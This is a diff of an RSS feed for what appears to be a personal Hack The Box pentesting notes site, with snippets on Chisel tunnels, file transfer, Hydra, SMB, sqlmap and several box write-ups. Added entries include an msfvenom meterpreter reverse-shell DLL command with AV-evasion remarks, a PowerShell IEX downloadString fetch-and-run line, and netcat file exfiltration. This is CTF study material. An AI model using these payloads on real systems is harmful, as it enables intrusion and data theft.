@@ -21,13 +21,25 @@
     
     <item>
       <title>BloodHound Neo4j</title>
-      <link>/tools/bloodhound/</link>
+      <link>/windows/bloodhound/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/tools/bloodhound/</guid>
+      <guid>/windows/bloodhound/</guid>
       <description>TAKE A SNAPSHOT BEFORE ATTEMPTING THIS.
 I would highly recommend installing Neo4j using the repository. Neo4j is a database for bloodhound API. I had a couple of issues installing this. had some issues with multiple versions of Java running. currently, neo4k only runs on Java 8 kali currently comes with 11.x. need to tell java to use the legacy version. Next, need to add the repository to download neo4j.
 ##### echo &amp;quot;deb http://httpredir.</description>
+    </item>
+    
+    <item>
+      <title>Burp</title>
+      <link>/webapp/burp/burp/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/webapp/burp/burp/</guid>
+      <description>DA BASICS
+&amp;lt;-
+Burp Suit is a graphical tool for web app security. It can do a host of things but in the free version its limited. In hack the box you will mostly use it to proxy web request and edit them before you send it off to the server. theres repeater which is basically like saving the web request allows you to repeat the web request.
+PROXY : Will set the ip address and port which burp will intercept the traffic.</description>
     </item>
     
     <item>
@@ -76,25 +88,26 @@ There&amp;rsquo;s a script running in the background that will reset all the cha
     
     <item>
       <title>ChiselTunnel</title>
-      <link>/tools/chisel/</link>
+      <link>/windows/chisel/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/tools/chisel/</guid>
-      <description>Chisel SERVER
+      <guid>/windows/chisel/</guid>
+      <description>MY FAVORITE SOCKS PROXY TOOL.
+Chisel SERVER
 ./Chisel server -p 8000 -reverse -v -reverse the connection this is important -v verbose -p port  Chisel.exe CLIENT
-c.exe client 10.10.15.254:8000 R:127.0.0.1:8001:localhost:8081	 </description>
+c.exe client 10.10.15.254:8000 R:8081:127.0.0.1:8081	 </description>
     </item>
     
     <item>
-      <title>DLL-Hijacking</title>
+      <title>DLL_CraFt&amp;BreW</title>
       <link>/concepts/dll/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/concepts/dll/</guid>
-      <description>Some binaries that run in syswow64 and have elevated execuation.
-SystemPropertiesComputerName.exe SystemPropertiesHardware.exe SystemPropertiesProtection.exe SystemPropertiesRemote.exe  This website will tell you the dll need for a bianry commonly found in windows most likel x86.
-https://lolbas-project.github.io/
-tzsync /? set COR_ENABLE_PROFILING=1 set | findstr COR  https://github.com/attl4s/pruebas/blob/master/Beryllium.dll</description>
+      <description>So, far i have done a handful of attacks with dlls. making a dll can be tricky especial when it comes to bypassing AV. Microsoft has been getting good at impoving signatures picking up the low hanging fruit. Msfvenom &amp;amp; dll&amp;rsquo;s crafted with visual studio&amp;rsquo;s. cheers to IppSec and 0xdf
+MSFVENOM remember you don&amp;rsquo;t always need x64
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.10.14.128 lport=19135 -f dll &amp;gt; NameMe.dll  Beryllium https://github.com/attl4s/pruebas
+a dll that contains meterpreter shell that takes env var as variables</description>
     </item>
     
     <item>
@@ -117,10 +130,10 @@ tzsync /? set COR_ENABLE_PROFILING=1 set | findstr COR  https://github.com/attl4
     
     <item>
       <title>FTP</title>
-      <link>/tools/ftp/</link>
+      <link>/linux/ftp/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/tools/ftp/</guid>
+      <guid>/linux/ftp/</guid>
       <description>File transfer protocol is a terrible service and you should never run it without some kind of protection in front of it. I&amp;rsquo;ve bumped into quite a few boxes running FTP. I often forget all the commands you can run with ftp.
 https://slacksite.com/other/ftp.html
 mget * download everything in the directory get download file / documents put upload file / documents nmap (maybe even in intereactive mode)  SSHFS &amp;amp; SFTP</description>
@@ -151,6 +164,25 @@ upload = nc -w 3 [your_ip] 1337 &amp;lt; file.txt listener = nc -lp 1337 &amp;gt
     </item>
     
     <item>
+      <title>File Transfer</title>
+      <link>/linux/filetransfer/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/linux/filetransfer/</guid>
+      <description>There&amp;rsquo;s more than one way to skin a cat. This guide will cover way&amp;rsquo;s, to move files off of a Linux environment. This guide will cover tools you can find natively on most Linux environments, you may also move over binaries of the tool you wish to use to move the file off.
+NOTICE : KEY WHEN IT SAYS DOWNLOAD USER PYTHON HTTP SERVER, WHEN IT SAY UPLOAD US NETCAT EXAMPLES BELOW.</description>
+    </item>
+    
+    <item>
+      <title>File Transfer</title>
+      <link>/windows/filetransfer/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/windows/filetransfer/</guid>
+      <description>UNDERDEVELOPMENT GONNA GO DO SOME CTF LOL  #####################Window############## Download ​``` # Python http server ​``` listener = python3 -m http.server 9090 listener = python -m SimpleHTTPServer 9090 Invoke = IEX(New-Object Net.WebClient).downloadString(&#39;http://IP_ADDRESS/file-needed&#39;) Invoke-Web-Request = powershell IWR &amp;quot;http://10.10.14.49/nc.exe&amp;quot; -OutFile nc.exe ############################################ Upload using SMB to share files i would like to note that that impacket might hang and since its written in python. ps -ef|grep python. #target machine net use z: \\IP_ADDRESS\share ​``` # kali machine ​``` impacket-smbserver share `pwd` | ` not &#39; #target machine copy file_name z: ###################### note if you have issues try this method ###################################### #target machine net use z: \\IP_ADDRESS\share ​``` # kali machine impacket-smbserver share `pwd` | ` not &#39; #target machine cd z: mkdir tmp cd tmp IEX(New-Object Net.</description>
+    </item>
+    
+    <item>
       <title>Flujab</title>
       <link>/hackthebox/boxes/flujab/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -168,6 +200,17 @@ Changeing /etc/hosts didn&amp;rsquo;t notice any change then i went to 0xdf note
       
       <guid>/hackthebox/boxes/friendzone/</guid>
       <description>Not shown: 993 closed ports [326/1271] PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: |_ 256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519) 53/tcp open domain ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux) | dns-nsid: |_ bind.version: 9.11.3-1ubuntu1.2-Ubuntu 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Friend Zone Escape software 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 443/tcp open ssl/http Apache httpd 2.</description>
+    </item>
+    
+    <item>
+      <title>GoBuster</title>
+      <link>/webapp/gobuster/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/webapp/gobuster/</guid>
+      <description>What is Gobuster? Gobuster is a web application fuzzer designed to enumerate Web Directories and Domains
+Gobuster has been recently updated, it has some new features and they changed it everything around. It&amp;rsquo;s still the gobuster we Love but its different now it went though some changes. I&amp;rsquo;m not sure if the kali repo has updated yet, you may need to download gobuster form the github repo.
+Example&amp;rsquo;s For DIR:</description>
     </item>
     
     <item>
@@ -192,6 +235,17 @@ First off id like to say I wish there was a way to do this with less command lin
     </item>
     
     <item>
+      <title>Hydra</title>
+      <link>/webapp/hydra/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/webapp/hydra/</guid>
+      <description>Hydra is a WebApp Brutefocer. suupply it with the required information and it will enumrate logins based on customer login word list of you could use rock you.
+Hydra v8.8 &amp;copy; 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+ Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PO RT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [service://server[:PORT][/OPT]] Options: -R restore a previous aborted/crashed session -I ignore an existing restore file (don&#39;t wait 10 seconds) -S perform an SSL connect -s PORT if the service is on a different default port, define it here -l LOGIN or -L FILE login with LOGIN name, or load several logins from FILE -p PASS or -P FILE try password PASS, or load several passwords from FILE -x MIN:MAX:CHARSET password bruteforce generation, type &amp;quot;-x -h&amp;quot; to get help -y disable use of symbols in bruteforce, see above -e nsr try &amp;quot;n&amp;quot; null password, &amp;quot;s&amp;quot; login as pass and/or &amp;quot;r&amp;quot; reversed login -u loop around users, not passwords (effective!</description>
+    </item>
+    
+    <item>
       <title>LightWeight</title>
       <link>/hackthebox/boxes/lightweight/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -205,14 +259,14 @@ Linux version 3.</description>
     </item>
     
     <item>
-      <title>Linux Enumeration</title>
-      <link>/concepts/linux_enum/</link>
+      <title>Network Manager Down</title>
+      <link>/hackthebox/boxes/help/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/concepts/linux_enum/</guid>
-      <description>I always start with nmap i use TCP Connect switch, then move to targeted scans. Then i run a full udp scan. While udp is being scanned. I will then move to gobuster, start manual enumeration. Things to look for are input fields of any kind, look for php parameters/actions in the source.
-nmap
-nmap -sT -p- -T5 -oA nmap/tcpconnect ipaddr nmap -sC -sV -T4 -pport,port,port -oA nmap/targeted ipaddr nmap -sU -p- -T5 -oA nmap/udp ipaddr  Gobuster</description>
+      <guid>/hackthebox/boxes/help/</guid>
+      <description>The weirdest glitch bug I&amp;rsquo;ve ever experienced I am not sure I how I deleted the icon but it disappeared I could no longer access the network manager. Well fix the problem and see how to get to the internet without the network manager.
+I&amp;rsquo;m not sure if completely removing the network manager is required but i purged it out.
+ sudo apt-get purge network-manager  To gain internet access reset the dhclient on the network interface, your network card maybe not be named eth0.</description>
     </item>
     
     <item>
@@ -228,12 +282,11 @@ I&amp;rsquo;m not sure if completely removing the network manager is required bu
     
     <item>
       <title>Nmap</title>
-      <link>/tools/nmap/</link>
+      <link>/linux/nmap/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/tools/nmap/</guid>
-      <description>tcp connect its quicker and might discover some hidden services
-nmap -sT -p- -Pn -T5 nmap/initial ip_addr  Next move to targeted nmap scans.</description>
+      <guid>/linux/nmap/</guid>
+      <description>Nmap is a port scanning tool that can enumerate devices operating systems and even run scripts that intrusive. Allot of tools have a wide range of abilities but specialize at one thing. Nmap uses ping sweeps and a lot of math to figure everything out. For example based ping time to live, you can figure out the operating system based on how lit takes to handle the information ~128 windows ~64 Linux.</description>
     </item>
     
     <item>
@@ -257,10 +310,10 @@ nmap -sV -sC 10.10.10.8 Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-25 00
     
     <item>
       <title>SMB</title>
-      <link>/tools/smb/smb/</link>
+      <link>/windows/linux-smb-enum/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/tools/smb/smb/</guid>
+      <guid>/windows/linux-smb-enum/</guid>
       <description>Mounting smb shares linux
 You may get an error, this means that the supporting programs aren&amp;rsquo;t there.
 sudo apt install cifs-utils -y sudo apt install nfs-common  Error Message
@@ -268,6 +321,30 @@ bad option; for several filesystems (e.g. nfs, cifs) you might need a /sbin/moun
 mount -o user=REPLACE &#39;//ip_addr/share&#39; /mnt/share  +++
 SMBCLIENT
 Usage: smbclient service &amp;lt;password&amp;gt; -R, --name-resolve=NAME-RESOLVE-ORDER Use these name resolution services only -M, --message=HOST Send message -I, --ip-address=IP Use this IP to connect to -E, --stderr Write messages to stderr instead of stdout -L, --list=HOST Get a list of shares available on a host -m, --max-protocol=LEVEL Set the max protocol level -T, --tar=&amp;lt;c|x&amp;gt;IXFqgbNan Command line tar -D, --directory=DIR Start from directory -c, --command=STRING Execute semicolon separated commands -b, --send-buffer=BYTES Changes the transmit/send buffer -t, --timeout=SECONDS Changes the per-operation timeout -p, --port=PORT Port to connect to -g, --grepable Produce grepable output -q, --quiet Suppress help message -B, --browse Browse SMB servers using DNS Help options: -?</description>
+    </item>
+    
+    <item>
+      <title>SMB-KALI</title>
+      <link>/windows/smb/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/windows/smb/</guid>
+      <description>Mounting smb shares linux
+You may get an error, this means that the supporting programs aren&amp;rsquo;t there.
+sudo apt install cifs-utils -y sudo apt install nfs-common  Error Message
+bad option; for several filesystems (e.g. nfs, cifs) you might need a /sbin/mount.&amp;lt;type&amp;gt; helper program.  Example
+mount -o user=REPLACE &#39;//ip_addr/share&#39; /mnt/share  +++
+SMBCLIENT
+Usage: smbclient service &amp;lt;password&amp;gt; -R, --name-resolve=NAME-RESOLVE-ORDER Use these name resolution services only -M, --message=HOST Send message -I, --ip-address=IP Use this IP to connect to -E, --stderr Write messages to stderr instead of stdout -L, --list=HOST Get a list of shares available on a host -m, --max-protocol=LEVEL Set the max protocol level -T, --tar=&amp;lt;c|x&amp;gt;IXFqgbNan Command line tar -D, --directory=DIR Start from directory -c, --command=STRING Execute semicolon separated commands -b, --send-buffer=BYTES Changes the transmit/send buffer -t, --timeout=SECONDS Changes the per-operation timeout -p, --port=PORT Port to connect to -g, --grepable Produce grepable output -q, --quiet Suppress help message -B, --browse Browse SMB servers using DNS Help options: -?</description>
+    </item>
+    
+    <item>
+      <title>Sense</title>
+      <link>/hackthebox/boxes/sense/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/hackthebox/boxes/sense/</guid>
+      <description>Sense, well be attacking pfsense 2.14 which has a couple of vulnerabilities, pfsense will block you for 24 hours if it detects brute forcing or 15 failed login attempts. To get around this ippsec tunnel through another machine enumerated that way. Using a web directory fuzzer will find two text files that offer some clues to the cmd injection exploit, and the username. I suppose were suppose to guess the password is still pfsense when the username is changed but oh well.</description>
     </item>
     
     <item>
@@ -291,14 +368,48 @@ Usage: smbclient service &amp;lt;password&amp;gt; -R, --name-resolve=NAME-RESOLV
     </item>
     
     <item>
-      <title>SqlMap</title>
-      <link>/tools/webapp/sqlmap/sqlmap/</link>
+      <title>Sneaky</title>
+      <link>/hackthebox/boxes/sneaky/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/tools/webapp/sqlmap/sqlmap/</guid>
+      <guid>/hackthebox/boxes/sneaky/</guid>
+      <description>The goal of this guide since ill be using other guides to solve it will be to learn as much as possible. There are two open ports, 80 &amp;amp; 161 on udp snmp. The webpage is under development, with a web directory that hides some content.
+nmap -sT -Pn -T5 -oA nmap/initial 10.10.10.60 -sT full tcp connection three way handshake -Pn treat ports as if they are open -T5 super speed ### 80 ### nmap -sU --top-port 1000 -oA nmap/udp 10.</description>
+    </item>
+    
+    <item>
+      <title>SqlMap</title>
+      <link>/webapp/sqlmap/sqlmap/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/webapp/sqlmap/sqlmap/</guid>
       <description>SqlMap automates finding sql-injection it can use GET or POST request. It&amp;rsquo;s pretty neat.
 In burp right click select copy to file, this will test for sql injection. pretty cool wasn&amp;rsquo;t aware it would test all the parameters. sqlmap &amp;ndash;batch -r login.req
 sqlmap --batch -u &amp;quot;http://os.htb/users/admin*&amp;quot; --level 5 --risk 3 -u url also for get request --batch run default yes --* = the parameter to fuzz --dump , --dump-all dumping sqldb to a localfile in /  </description>
+    </item>
+    
+    <item>
+      <title>TMUX</title>
+      <link>/hackthebox/tmux/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/hackthebox/tmux/</guid>
+      <description>TMUX
+okay, because my kali linux crash i had to reintall tmux. i really like gpakaosz theme pack for tmux. cd into your home directory, then create a symlink to .tmux.conf so when tmux runs it will look in you&amp;rsquo;re &amp;ldquo;home&amp;rdquo; directory in kali thats ~/ or /root/
+apt-get install tmux cd ~/ git clone ln -s .tmux/.tmux.conf -f force cp .tmux/.tmux.conf.local .  </description>
+    </item>
+    
+    <item>
+      <title>Tunnels</title>
+      <link>/linux/tunneling/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/linux/tunneling/</guid>
+      <description>SSH PORTFORWARDING
+ssh port forwarding will create &amp;ldquo;tunnels&amp;rdquo; allowing access to the network on the host. examples would be using localhost,or a private address.
+ssh user@ip_addr -L LocalPort:address_ip:HostPort  SSH BIND PORT
+Bind&amp;rsquo;s a port locally on both sides, creating a tunnel to the localhost on the victim. works with socks 4 &amp;amp; 5
+ssh -D8080 USER@IPADDRESS  Sshuttle Creates a VPN connection using the SSH protocol; forwarding all traffic to the target&amp;rsquo;s network.</description>
     </item>
     
     <item>
@@ -314,17 +425,18 @@ so it turns out its not sql injections pretty happy with that.</description>
     
     <item>
       <title>Windows</title>
-      <link>/concepts/windows_enum/</link>
+      <link>/windows/windows_enum/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/concepts/windows_enum/</guid>
-      <description>Shell preferences nishang &amp;lt; nc &amp;lt; winrm / meterpreter
-whoami /all /priv systeminfo  $ExecutionContext.SessionState.LanguageMode  change password inside powershell.
+      <guid>/windows/windows_enum/</guid>
+      <description>Commands
+Finding things in windows.
+find /I &amp;quot;thing&amp;quot; secrets.txt findstr &amp;quot;thing&amp;quot;  Shell preferences nishang &amp;lt; nc &amp;lt; winrm / meterpreter
+whoami /all /priv systeminfo findstr	= grep  $ExecutionContext.SessionState.LanguageMode  change password inside powershell.
 $password = read-host &amp;quot;Su-ErD;perPa$sw0rd&amp;quot; -assecurestring $useraccount = get-localuser -name &amp;quot;pinkiepie&amp;quot; $useraccount | set-localuser -password $password  os
 https://developer.microsoft.com/en-us/windows/downloads/virtual-machines
 Windows File Type for running commands scripts executables. I found this list looking up applocker policies.
-AppLocker ApplockerFileExtentions
-   Executable Scripts Installers DLL     exe js msi dll   com ps1 msp ocx    vbs      cmd      bat      HOST BASED FIREWALL</description>
+AppLocker ApplockerFileExtentions</description>
     </item>
     
     <item>
@@ -335,6 +447,18 @@ AppLocker ApplockerFileExtentions
       <guid>/concepts/bypass/</guid>
       <description>I have kept running in applocker and antivirus, and CLM (constrained language mode) I would like to cover some different ways to bypass these restrictions. CLM designed to make our job harder. Basically takes away allot methods and invoke. Which means we can&amp;rsquo;t just call powerview and run in it memory. you could still download it and bypass Defender with some kind of encoding/encryption.
 CLM uses umci policy to determine what powershell scripts are approved(whitelisted).</description>
+    </item>
+    
+    <item>
+      <title>ssh</title>
+      <link>/linux/ssh/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/linux/ssh/</guid>
+      <description>SSH - secure shell Is a commonly used port/service. In fact, it is almost on every Linux Box on hackthebox. Network administrators use it to remotely managing Network Peripherals. There are a couple CVE&amp;rsquo;s out there for older version 7.3 Open Ssh is vulnerable to a user enumeration attack.
+SSH will commonly use sha-256 encryption to encrypt the traffic. The encryption Bit-Key is commonly set at 2048.
+Start Service
+Directories private keys might be in</description>
     </item>
     
     <item>
